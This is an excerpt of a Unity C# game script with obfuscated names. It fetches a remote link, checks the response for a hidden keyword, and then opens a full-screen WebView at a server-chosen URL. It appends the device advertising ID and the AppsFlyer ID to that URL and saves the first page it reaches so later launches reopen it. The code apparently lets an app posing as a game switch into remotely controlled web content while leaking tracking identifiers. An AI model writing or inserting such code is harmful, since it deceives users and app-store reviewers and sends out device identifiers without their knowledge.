...
public class Gncv : MonoBehaviour
{
    ...
    private void Awake()
    {
        if (PlayerPrefs.GetInt("sobaki") != 0)
        {
    ...
    private void Start()
    {
        ...
        {
            if (PlayerPrefs.GetString("koshechki", string.Empty) != string.Empty)
            {
                LoadWebView(PlayerPrefs.GetString("koshechki"));
            }
            else
            {
    ...
    private IEnumerator StartWebviewInit()
    {
        using (UnityWebRequest mmxasdas = UnityWebRequest.Get(_collectedLink))
        {
            ...
            int timerloader = 7;
            while (PlayerPrefs.GetString("Bobrkurva", "") == "" && timerloader > 0)
            {
            ...
            try
            {
                ...
                {
                    if (mmxasdas.downloadHandler.text.Contains("ruveleb"))
                    {

                        try
                        {
                            var subs = mmxasdas.downloadHandler.text.Split('|');
                            LoadWebView(subs[0] + "?idfa=" + _idfaData + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("Bobrkurva", ""), subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {

                            LoadWebView(mmxasdas.downloadHandler.text + "?idfa=" + _idfaData + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("Bobrkurva", ""));
                        }
                    }
                    else
                    {
    ...
    private void LoadWebView(string jijsda, string mvcnma = "", int hues = 70)
    {
        ...
        wvparam.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("koshechki", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("koshechki", url);
            }
        };
        wvparam.Load(jijsda);
        wvparam.Show();
